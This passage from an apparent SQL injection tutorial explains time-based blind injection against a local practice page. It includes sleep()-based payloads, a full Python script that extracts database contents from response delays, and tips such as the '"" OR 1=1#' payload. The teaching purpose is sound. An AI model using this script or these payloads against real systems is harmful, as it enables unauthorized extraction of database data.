![PHP code completely commented without differentiated response](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-58.avif)

This way, there's no way to differentiate:

![Identical response with false condition 2=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-59.avif)

![Identical response with true condition 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-60.avif)

What do we do then?

Well, there's an instruction which is sleep() (it's like this in the case of MySQL/MariaDB, it can vary depending on the manager, so as always, it's best to look at a cheatsheet). This instruction as you can imagine will make a time pause of the seconds you indicate, for example, sleep(5) will make a 5-second pause.

Well, with this instruction, the idea is very similar to Boolean-Based, we can build a statement like the following:

- 1 AND IF((SUBSTR(database(), 1, 1)='a'), sleep(5), 1)#

In this case we're making use of IF, which has the following structure:

- IF(<condition>, <if it's true this is executed>, <if it's not true this is executed>)

As such, the statement we have placed in the IF condition is exactly the same as the Boolean-Based one. We know that this statement will give TRUE if the letter matches and FALSE if not.

So, if it's TRUE (the letter matches), the sleep(5) instruction will execute, which will make the server take 5 seconds to respond, otherwise, it won't do anything.

With all this, it's really simple, if the server takes 5 seconds to respond it means that the letter we've put matches. Example:

![Browser showing 5-second delay with sleep](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-61.avif)

The web will stay loading for 5 seconds, since the first letter of the database name is a w.

So, we can make a script that determines which letters are correct based on how long the server takes to respond:

```python
#!/usr/bin/python3

import requests
import sys
import time

uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
lowercase = uppercase.lower()
numbers = '1234567890'
symbols = '|@#~!"·$%&/()=:.-_,; <>[]{}?\r\n'

dictionary = lowercase + uppercase + numbers + symbols

def check(offset, letter):

    time_start = time.time()
    response = requests.get("http://localhost/books.php?id=1 AND IF((SUBSTR(database(), %d, 1)='%s'), sleep(5), 1)#" % (offset, letter))
    time_end = time.time()

    if time_end - time_start > 5:
        return 1

def timeSQL():

    global info
    info = ''

    for i in range(1,100):

        stop = False

        for j in dictionary:

            if check(i, j):

                print("Letter number %d is %s" % (i, j))

                info += j

                stop = False

                break

            stop = True

        if stop:
            break

if __name__ == '__main__':

    timeSQL()

    print("\nThe database name is %s" % info)
```

Running the script, look how beautiful:

![Python script executing with Time-based SQL Injection](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-62.avif)

It extracts the name little by little, all based on how long the server takes to respond:

![Complete Time-based script result showing webserver](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-63.avif)

Look how it matches, webserver has 9 letters, and we've indicated a sleep of 5 seconds, so 9x5 = 45 which is exactly the time the script took (it could take a few more seconds depending on the case, but not much).

And now, just like what we did with Boolean-Based, we would change the SQL statement to obtain the information we want:

![Script modified to extract user with Time-based](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-64.avif)

![Time-based script result extracting admin user](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-65.avif)

And this would basically be a time-based Blind SQL.

## Out-of-Band

Last but not least, Out-of-Band SQL Injection. This SQL Injection in essence is the same as Blind, since the server doesn't return in the response any information from the SQL statement result. However, when we refer to Out-of-Band, we mean that perhaps we have the possibility of exfiltrating the information to a remote server.

It's not different in terms of SQL statements and techniques we've seen throughout this post. The only difference is the already mentioned one, that perhaps we are able to exfiltrate/send the responses to a server controlled by us and, in this way, be able to obtain and read the results of the queries made.

This technique is more advanced and can be dedicated an entire post, so we'll see it another time. However, it's enough if you remember that it exists and its purpose.

## Conclusion

We've seen many concepts and details in this post. To finish, I'd simply like to give some details:

- All SQL statements must end with ;, in the images where we executed the statements in the terminal you can see how it was always placed. With this I'm saying that it can also be good practice to end our injections with ; in addition to the already mentioned comment instruction --> ;#
- Typically, in SQL Injection single quotes are usually used, but this won't always be the case, in the end it will depend on what quotes the server is using in the background. So we have to alternate in case one doesn't work to see if the other does.
    - That is, if for example in a statement, the field where we introduce in the code is surrounded by:
        - "<value we control>"
    - Well, although the single quote will generate a failure and perhaps we can see an SQL error, when doing for example this:
        - "" OR 1=1#"
    - We will have to use a double quote.
- SQLi are not limited to GET type requests, it can really happen in any field where we enter data, whether POST or GET.

All this I just mentioned are simply details that it's good for you to know in order to think of ways to do SQL injections.

## References

- _[SQL commands guide on Guru99: DML, DDL, DCL, TCL, DQL with examples](https://www.guru99.com/sql-commands-dbms-query.html#4)_
- _[MySQL cheatsheet on devhints.io](https://devhints.io/mysql)_
- _[NoSQL database fundamentals on MongoDB](https://www.mongodb.com/nosql-explained)_
- _[Error-based SQL Injection exploitation on Akimbo Core](https://akimbocore.com/article/sql-injection-exploitation-error-based/)_
- _[MySQL SQL Injection practical cheatsheet on Perspective Risk](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)_
- _[SQL Injection course on HackTheBox Academy](https://academy.hackthebox.eu/)_
- _[Web Application Penetration Testing course on INE](https://my.ine.com/INE/courses/38316560/web-application-penetration-testing)_
